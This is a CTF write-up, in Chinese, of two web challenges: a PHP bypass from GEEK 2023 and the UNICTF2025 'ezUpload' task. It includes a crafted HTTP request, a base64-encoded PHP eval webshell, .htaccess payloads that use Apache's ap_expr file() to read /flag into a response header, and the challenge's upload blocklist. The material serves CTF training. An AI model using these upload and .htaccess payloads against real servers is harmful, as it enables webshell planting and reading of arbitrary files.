# CTF+

```
 <?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);

highlight_file(__FILE__);
include_once('flag.php');
if(isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!') {
    if (intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024) {
        if (isset($_POST['qw']) && $_POST['yxx']) {
            $array1 = (string)$_POST['qw'];
            $array2 = (string)$_POST['yxx'];
            if (sha1($array1) === sha1($array2)) {
                if (isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023']="Happy to see you!")) {
                    echo $flag;
                } else {
                    echo "再绕最后一步吧";
                }
            } else {
                echo "好哩，快拿到flag啦";
            }
        } else {
            echo "这里绕不过去，QW可不答应了哈";
        }
    } else {
        echo "嘿嘿嘿，你别急啊";
    }
}else {
    echo "不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！";
}
?>

不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！ 
```

```
POST /?syc=Welcome+to+GEEK+2023!%0a&lover=2.023e4 HTTP/1.1
Host: 80-e9a02c17-2e03-4a38-9532-a915779fa583.challenge.ctfplus.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

qw=1&yxx=1&SYC[GEEK.2023=Happy%20to%20see%20you!
```

## UNICTF2025-ezUpload

简单的文件上传？

php经过严格的过滤，明显是不允许的，尝试编码，编码的话需要htaccess，于是发现可以上传.htaccess

```
auto_prepend_file="php://filter/convert.base64-decode/resource=shell.txt"

shell.php
PD9waHAgZXZhbCgkX1BPU1RbMV0pID8+
```

但是发现有除了特殊字符，还有关键词

```
php filter base64
```

于是尝试别的.htaccess方式

```
ErrorDocument 404 /flag
```

*(解释：告诉服务器，当发生 404 错误时，把 /flag 的内容发给用户)*

```
RewriteEngine On
RewriteRule shell.txt /flag
```

*(解释：当你访问 shell.txt 时，服务器在后台偷偷换成 /flag 发给你)*

**触发安全检查：** 在真正读取文件前，Apache 会进入 **权限校验阶段 (Access Control)**。它会检查目标路径 `/flag` 是否在允许访问的 Web 目录（DocumentRoot）之内。会Accesss Denied

### **正解**

```
Options +Indexes
DirectoryIndex /123.txt
Header set X-Flag "expr=%{file:/flag}"
```

```
RewriteEngine On
RewriteCond expr "file('/var/www/html/index.p'.'hp') =~ /(.+)/"
RewriteRule .* - [E=FLAG_CONTENT:%1]
Header set Falg "%{FLAG_CONTENT}e"


RewriteCond expr "file('/flag') =~ /(.+)/"：
读取并匹配：首先利用 file() 读取 flag。
正则捕获：使用 =~ /(.+)/ 进行正则匹配。括号中的 (.+) 会将整个文件内容捕获到 Apache 的内部回溯引用（Backreference） %1 中。
RewriteRule .* - [E=FLAG_CONTENT:%1]：
-：表示不进行路径重写（Pass-through）。
[E=FLAG_CONTENT:%1]：设置一个环境变量（Environment Variable），名为 FLAG_CONTENT，其值就是刚才捕获的 %1（即 flag 内容）。
Header set Falg "%{FLAG_CONTENT}e"：
%{...}e：最后的 e 代表从“环境变量”中提取值。
结果：将内存中的环境变量输出到名为 Falg 的响应头。
```

### 核心机制：`ap_expr` 表达式引擎

Apache 表达式引擎允许在配置文件中使用类似编程语言的逻辑。其中最“致命”的函数就是 **`file()`**。

- **功能**：直接读取服务器本地文件的内容。
- **权限**：它以运行 Apache 进程的用户身份（如 `www-data`）执行。只要该用户对 `/flag` 有读权限，它就能绕过所有的 Web 目录访问限制（如 `Require all denied`）。

题目源码

```
<?php
error_reporting(0);

$upload_dir = '/var/www/html/upload/';
$max_size = 1024; // 1KB

// 限制符号：拦截了 PHP 标签、变量符和命令执行符
$forbidden_chars = ['?', '$', '&', ';', '|', '`', '<?', '<%', '<', '\\'];

// 限制关键字：拦截了常见的伪协议和 Apache 敏感指令
$forbidden_keywords = [
    'php',
    'base64',
    'data:',
    'expect:',
    'input',
    'filter',
    'ErrorDocument',
    'permanent',
    'redirect',
    'php_value',
];

/**
 * 检查字符串是否包含黑名单字符
 */
function contains_forbidden_char($str, $forbidden) {
    foreach ($forbidden as $char) {
        if (strpos($str, $char) !== false) return true;
    }
    return false;
}

/**
 * 检查字符串是否包含黑名单关键字（不区分大小写）
 */
function contains_forbidden_keyword($str, $keywords) {
    $str_lower = strtolower($str);
    foreach ($keywords as $keyword) {
        // 如果关键字包含 .* 则走正则匹配逻辑
        if (strpos($keyword, '.*') !== false) {
            $pattern = '/' . str_replace('.*', '.*', preg_quote($keyword, '/')) . '/i';
            if (preg_match($pattern, $str)) return true;
        } else {
            if (strpos($str_lower, strtolower($keyword)) !== false) return true;
        }
    }
    return false;
}

$message = '';
$message_type = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $tmp_name = $_FILES['file']['tmp_name'];
        $filename = basename($_FILES['file']['name']);
        $filesize = $_FILES['file']['size'];

        // 1. 检查文件大小
        if ($filesize > $max_size) {
            $message = "File too large! Maximum size is 1KB.";
            $message_type = 'error';
        } 
        // 2. 检查文件名是否包含非法字符
        elseif (contains_forbidden_char($filename, $forbidden_chars)) {
            $message = "Forbidden characters in filename!";
            $message_type = 'error';
        } 
        else {
            $content = file_get_contents($tmp_name);
            // 3. 检查文件内容是否包含非法字符
            if (contains_forbidden_char($content, $forbidden_chars)) {
                $message = "Forbidden characters in file content!";
                $message_type = 'error';
            } 
            // 4. 检查文件内容是否包含关键字
            elseif (contains_forbidden_keyword($content, $forbidden_keywords)) {
                $message = "Forbidden keywords detected!";
                $message_type = 'error';
            } 
            // 5. 校验通过，执行上传
            else {
                $target_path = $upload_dir . $filename;
                if (move_uploaded_file($tmp_name, $target_path)) {
                    chmod($target_path, 0644);
                    $message = "File uploaded successfully!<br>Path: <a href=\"/upload/{$filename}\">/upload/{$filename}</a>";
                    $message_type = 'success';
                } else {
                    $message = "Failed to save file!";
                    $message_type = 'error';
                }
            }
        }
    } else {
        $message = "Please select a file to upload.";
        $message_type = 'error';
    }
}
?>
```

